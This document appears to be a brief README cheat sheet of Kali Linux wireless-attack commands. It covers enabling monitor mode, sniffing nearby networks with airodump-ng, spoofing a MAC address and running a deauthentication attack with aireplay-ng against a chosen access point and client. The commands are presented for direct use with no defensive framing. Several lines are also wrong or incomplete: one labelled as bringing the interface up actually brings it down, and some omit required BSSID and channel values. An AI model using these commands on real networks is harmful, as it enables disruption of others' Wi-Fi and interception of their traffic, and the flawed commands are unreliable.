# Kali-Linux-Commands

## Enabling Monitor Mode

* Show all network devices `iwconfig` 
* To make sure network device is up and running `ifconfig wlan1 up` 
* Show all network cards `airmon-ng`
* To prevent from disabling monitor mode `airmon-ng check kill`
* Start monitor mode `airmon-ng start wlan1`

## Reset to normal mode

* `airmon-ng stop wlan1mon` : Stop monitor mode
* `service network-manager start` : Restart network settings

## Sniffing Packets using airodump-ng

* `airodump-ng wlan1mon` : Start sniffing
* *PWR = Signal Strength should be above than -70*

* `airodump-ng --bssid wlan1mon` :  Targeted sniffing


## macchanger

* `ifconfig wlan1 down` : Bring down the interface
* `macchanger -r wlan1` : Change mac address to random
* `ifconfig wlan1 down` : Bring the interface up

## Deauth Attacks

* `airodump-ng --channel --bssid  wlan1mon`
* `aireplay-ng --deauth 2000 -a [MAC of Access Point] [MAC of  Client] wlan1mon`







